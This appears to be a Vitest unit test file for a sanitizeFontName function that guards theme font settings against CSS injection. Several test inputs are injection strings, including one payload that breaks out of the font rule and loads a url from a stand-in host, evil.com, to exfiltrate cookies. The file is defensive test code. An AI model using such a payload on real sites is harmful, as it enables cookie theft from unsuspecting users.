import { describe, it, expect } from "vitest";
import { sanitizeFontName } from "./themes";

describe("sanitizeFontName", () => {
  it("passes through normal font names", () => {
    expect(sanitizeFontName("Cascadia Code")).toBe("Cascadia Code");
    expect(sanitizeFontName("JetBrains Mono")).toBe("JetBrains Mono");
    expect(sanitizeFontName("Fira Code")).toBe("Fira Code");
  });

  it("allows hyphens and dots", () => {
    expect(sanitizeFontName("Noto-Sans")).toBe("Noto-Sans");
    expect(sanitizeFontName("Font.Name")).toBe("Font.Name");
  });

  it("strips quotes that could break CSS interpolation", () => {
    expect(sanitizeFontName('Consolas"')).toBe("Consolas");
    expect(sanitizeFontName("Consolas'")).toBe("Consolas");
  });

  it("strips semicolons that could inject CSS", () => {
    expect(sanitizeFontName("Consolas; } body { color: red")).toBe("Consolas  body  color red");
  });

  it("strips parentheses that could call url()", () => {
    expect(sanitizeFontName("font); url(evil.com")).toBe("font urlevil.com");
  });

  it("strips backslashes", () => {
    expect(sanitizeFontName("font\\name")).toBe("fontname");
  });

  it("handles empty string", () => {
    expect(sanitizeFontName("")).toBe("");
  });

  it("strips full CSS injection payload", () => {
    const payload = 'Consolas", "Consolas", monospace; } * { background-image: url("https://evil.com/exfil?cookie=';
    const result = sanitizeFontName(payload);
    expect(result).not.toContain(";");
    expect(result).not.toContain("(");
    expect(result).not.toContain('"');
    expect(result).not.toContain("'");
  });
});
